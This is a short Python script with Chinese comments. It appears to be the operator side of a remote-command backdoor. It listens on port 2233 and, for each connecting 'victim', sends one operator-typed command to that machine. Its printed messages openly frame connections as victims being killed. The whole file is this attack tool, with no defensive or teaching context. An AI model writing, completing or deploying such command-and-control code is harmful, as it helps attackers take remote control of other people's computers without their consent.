# -- coding:utf-8--
import os
import socket

#声明主机
host = ""
#声明端口号
port = 2233
#创建sock套接字
sock = socket.socket()
#绑定主机和端口
sock.bind((host, port))
#开始监听
sock.listen(5)
#对话循环

print("kill start!")

while True:

	#堵塞连接
	cli, addr = sock.accept()
	print("有人受害了！")
	print(addr)
	cmd = input("命令：")
	zw = cli.recv(2048).decode()
	cli.sendall(cmd.encode())
	print("连接已结束，被害者已死亡！")
	print("\n\n\n")


